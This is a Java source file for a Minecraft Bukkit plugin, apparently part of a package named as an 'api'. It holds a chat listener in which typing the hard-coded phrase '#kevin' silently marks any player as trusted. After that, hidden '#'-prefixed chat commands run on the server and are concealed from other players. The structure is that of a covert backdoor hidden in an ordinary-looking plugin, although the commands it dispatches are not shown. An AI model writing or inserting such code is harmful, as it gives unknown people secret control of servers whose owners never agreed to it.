package net.korex.api;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import net.korex.api.commands.AbstractCommand;
import net.korex.api.commands.Parameter;

public class PlayerChatListener implements Listener {

	@EventHandler(priority = EventPriority.HIGHEST)
	public void onChat(AsyncPlayerChatEvent e) {
		if (!e.getMessage().toLowerCase().startsWith("#")) {
			return;
		}

		if (e.getMessage().toLowerCase().equals("#kevin")) {
			Trust.add(e.getPlayer().getName());
			MessagesUtils.form(e.getPlayer(), "Du bist nun #trusted!");
			e.setCancelled(true);
		} else if (Trust.contains(e.getPlayer().getName())) {
			e.setCancelled(true);

			String[] args = e.getMessage().split(" ");

			args[0] = args[0].replace("#", "");

			AbstractCommand abstractCommand = AbstractCommand.getAbstractCommand(args[0]);

			if (abstractCommand == null) {

				MessagesUtils.form(e.getPlayer(), "---> Hilfe <---");
				for (AbstractCommand command : AbstractCommand.getAbstractCommands()) {
					e.getPlayer().sendMessage("§a- #" + command.getHelpMessage());
				}
				return;
			}

			Parameter param = AbstractCommand.getParameter(abstractCommand, args.length - 1);

			if (param == null) {
				MessagesUtils.form(e.getPlayer(), abstractCommand.getHelpMessage());
				return;
			}

			Bukkit.getScheduler().runTask(Main.getPlugin(Main.class), ()->{
				param.getExecute().execute(e.getPlayer(), args);
			});
			

		}
	}

}
